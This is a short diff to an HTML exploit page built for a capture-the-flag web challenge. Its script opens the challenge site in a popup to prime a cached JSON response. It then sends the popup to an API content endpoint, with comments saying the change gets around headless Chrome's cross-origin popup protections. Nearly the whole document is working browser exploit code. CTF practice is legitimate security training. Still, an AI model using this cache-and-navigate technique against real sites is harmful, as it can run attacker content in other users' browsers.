@@ -4,16 +4,20 @@
     <title>Exploit</title>
 </head>
 <body>
-    <h1>Exploit is running...</h1>
+    <h1>Running Exploit...</h1>
     <script>
         const CHAL_URL = "http://chal.polyuctf.com:43265";
         const SITE_ID = "8b7750960050dfbe4c164d0679f5ea280caa5be7c24580275c1e7c5bfe627875";
         
+        // 1. Open the original site to force the $.getJSON Memory cache
         const w = window.open(`${CHAL_URL}/sites/${SITE_ID}`);
         
+        // 2. Wait 3 seconds, then tell the OPENED window to navigate to the API
         setTimeout(() => {
-            w.location = `${CHAL_URL}/api/sites/${SITE_ID}/content`;
-        }, 2000);
+             // Instead of w.location, we tell the window to navigate itself.
+             // This bypasses many cross-origin popup protections in headless Chrome.
+             w.location.href = `${CHAL_URL}/api/sites/${SITE_ID}/content`;
+        }, 3000);
     </script>
 </body>
 </html>
